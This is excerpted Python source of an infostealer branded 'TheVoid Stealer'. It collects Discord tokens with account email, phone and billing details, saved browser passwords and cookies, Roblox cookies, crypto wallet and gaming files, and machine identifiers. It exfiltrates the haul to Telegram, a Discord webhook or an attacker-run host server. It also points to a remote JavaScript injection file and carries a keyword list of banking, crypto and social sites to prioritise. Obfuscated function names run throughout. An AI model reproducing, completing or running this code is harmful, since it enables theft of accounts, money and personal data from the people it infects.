...
# Configuration
config = {
    "Telegram": False,    # Set to True to send to Telegram
    "Discord": False,     # Set to True to send to Discord webhook
    "Host": True        # Set to True to send to host server
}
...
# Host settings
host_url = "http://localhost/web_server/"  # Your server endpoint

inj3c710n_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
# fun fact this injection bull shit is stolen from creal so imma use therre shit.
color =  0x812118
DETECTED = False

def should_send_to_telegram():
    return config["Telegram"]

def should_send_to_discord():
    return config["Discord"]

def should_send_to_host():
    return config["Host"]

def send_to_host(data, file_path=None):
    try:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "TheVoid-Stealer/1.0"
        }
        
        payload = {
            "data": data,
            "timestamp": time.time(),
            "user_info": g108411NF0()
        }
        
        if file_path and os.path.exists(file_path):
            # Send file along with data
            with open(file_path, 'rb') as f:
                files = {'file': f}
                response = requests.post(host_url, files=files, data={'payload': dumps(payload)}, headers=headers, timeout=30)
        else:
            # Send JSON data only
            response = requests.post(host_url, json=payload, headers=headers, timeout=30)
    ...
    try:
        ...
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as file:
                bot.send_document(chat_id=telegram_chat_id, document=file, caption=message)
        else:
...
def format_telegram_message(title, content, user_info=None):
    message = f"*{title}*\n\n"
    if user_info:
        message += f"`{user_info}`\n\n"
    message += f"```\n{content}\n```"
...
# womp look at this shitty dual hook
    ...
    if pfp == None: 
        pfp = "https://tenebrisque.com/wp-content/uploads/2022/07/117647113_590314791682682_3790844457787039532_n-768x768.jpg"
    else:
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": "TheVoid Stealer | remember dont follow skids",
                "icon_url": "https://tenebrisque.com/wp-content/uploads/2022/07/117647113_590314791682682_3790844457787039532_n-768x768.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://tenebrisque.com/wp-content/uploads/2022/07/117647113_590314791682682_3790844457787039532_n-768x768.jpg",
        "username": "TheVoid Stealer",
        "attachments": []
        }
    ...
    if should_send_to_telegram():
        telegram_message = f"*?? Discord Token Found!*\n\n"
        telegram_message += f"*User:* `{username}#{hashtag}`\n"
        telegram_message += f"*ID:* `{idd}`\n"
        telegram_message += f"*Email:* `{email}`\n"
        telegram_message += f"*Phone:* {phone}\n"
        telegram_message += f"*Token:* `{token}`\n"
        telegram_message += f"*Badges:* {nitro}{badge}\n"
        telegram_message += f"*Billing:* {billing}\n"
        telegram_message += f"*Found in:* `{path}`\n\n"
        telegram_message += f"*{g108411NF0()}*"
        
        send_to_telegram(telegram_message)
    
    # Send to Host if enabled
    if should_send_to_host():
        host_data = {
            "type": "discord_token",
            "user": f"{username}#{hashtag}",
            "id": idd,
            "email": email,
            "phone": phone,
            "token": token,
...
class PcInfo:
    ...
    data = {
            ...
            "embeds": [
                {
                    "title": "TheVoid Stealer | System Info",
    ...
    # Send to Telegram if enabled
    if should_send_to_telegram():
        telegram_message = f"*?? System Information*\n\n"
        telegram_message += f"*PC Username:* `{username}`\n"
        telegram_message += f"*PC Name:* `{hostname}`\n"
        telegram_message += f"*OS:* `{computer_os}`\n\n"
        telegram_message += f"*IP:* `{ip}`\n"
        telegram_message += f"*MAC:* `{mac}`\n"
        telegram_message += f"*HWID:* `{hwid}`\n\n"
        telegram_message += f"*CPU:* `{cpu.Name}`\n"
        telegram_message += f"*GPU:* `{gpu.Name}`\n"
        telegram_message += f"*RAM:* `{ram}GB`\n\n"
        telegram_message += f"*{g108411NF0()}*"
...
data = {
            ...
            "embeds": [
                {
                    "title": "TheVoid Stealer | Roblox Information",
...
# Send to Telegram if enabled
if should_send_to_telegram():
    telegram_message = f"* Roblox Cookies Found!*\n\n"
    if roblochrome: telegram_message += f"*Chrome:* `{roblochrome}`\n"
    if robloedge: telegram_message += f"*Edge:* `{robloedge}`\n"
    if roblofire: telegram_message += f"*Firefox:* `{roblofire}`\n"
    if robloopera: telegram_message += f"*Opera:* `{robloopera}`\n"
    if roblogx: telegram_message += f"*OperaGX:* `{roblogx}`\n"
    if roblochromium: telegram_message += f"*Chromium:* `{roblochromium}`\n"
    telegram_message += f"\n*{g108411NF0()}*"
...
def UP104D(name, link):
    ...
    if name == "lxcook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "TheVoid Stealer | Cookies",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [TheVoidCookies.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "TheVoid Stealer | remember dont follow skids",
                        "icon_url": "https://tenebrisque.com/wp-content/uploads/2022/07/117647113_590314791682682_3790844457787039532_n-768x768.jpg"
        ...
        # Send to Telegram if enabled
        if should_send_to_telegram():
            telegram_message = f"*?? Browser Cookies Found!*\n\n"
            telegram_message += f"*Cookies Found:* {C00K1C0UNt}\n"
            telegram_message += f"*Websites:* {rb}\n"
            telegram_message += f"*Download:* [TheVoidCookies.txt]({link})\n\n"
            telegram_message += f"*{g108411NF0()}*"
            send_to_telegram(telegram_message)
        ...
        if should_send_to_host():
            host_data = {
                "type": "cookies",
                "cookies_count": C00K1C0UNt,
                "websites": rb,
                "download_link": link,
                "file_path": temp + "\\lxcook.txt"
            }
            send_to_host(host_data, temp + "\\lxcook.txt")
        return
    ...
    if name == "lxpassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "TheVoid Stealer | Passwords",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [TheVoidPasswords.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "TheVoid Stealer | remember dont follow skids",
                        "icon_url": "https://tenebrisque.com/wp-content/uploads/2022/07/117647113_590314791682682_3790844457787039532_n-768x768.jpg"
        ...
        # Send to Telegram if enabled
        if should_send_to_telegram():
            telegram_message = f"*?? Browser Passwords Found!*\n\n"
            telegram_message += f"*Passwords Found:* {P455WC0UNt}\n"
            telegram_message += f"*Websites:* {ra}\n"
            telegram_message += f"*Download:* [TheVoidPasswords.txt]({link})\n\n"
            telegram_message += f"*{g108411NF0()}*"
            send_to_telegram(telegram_message)
        ...
        if should_send_to_host():
            host_data = {
                "type": "passwords",
                "passwords_count": P455WC0UNt,
                "websites": ra,
                "download_link": link,
                "file_path": temp + "\\lxpassw.txt"
            }
            send_to_host(host_data, temp + "\\lxpassw.txt")
        return
    ...
    if name == "kiwi":
        ...
        # Send to Telegram if enabled
        if should_send_to_telegram():
            telegram_message = f"*📁 Important Files Found!*\n\n"
            telegram_message += f"{link}\n\n"
            telegram_message += f"*{g108411NF0()}*"
            send_to_telegram(telegram_message)
        ...
        if should_send_to_host():
            host_data = {
                "type": "files",
                "download_link": link,
                "description": "Important files found on victim's system"
            }
            send_to_host(host_data)
        return
...
def G47H3rZ1P5(paths1, paths2, paths3):
    ...
    # Send to Telegram if enabled
    if should_send_to_telegram():
        telegram_message = f"*?? Wallet & Gaming Files Found!*\n\n"
        if wal: telegram_message += f"{wal}\n"
        if ga: telegram_message += f"{ga}\n"
        if ot: telegram_message += f"{ot}\n"
        telegram_message += f"\n*{g108411NF0()}*"
    ...
    if should_send_to_host():
        host_data = {
            ...
            "gaming": ga,
            "other": ot,
            "description": "Wallet, gaming and other files found and zipped"
        }
        send_to_host(host_data)
...
def G47H3r411():
    ...
    threading.Thread(target=G47H3rZ1P5, args=[br0W53rP47H5, P47H570Z1P, ["", "", ""]]).start()
...
k3YW0rd = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]
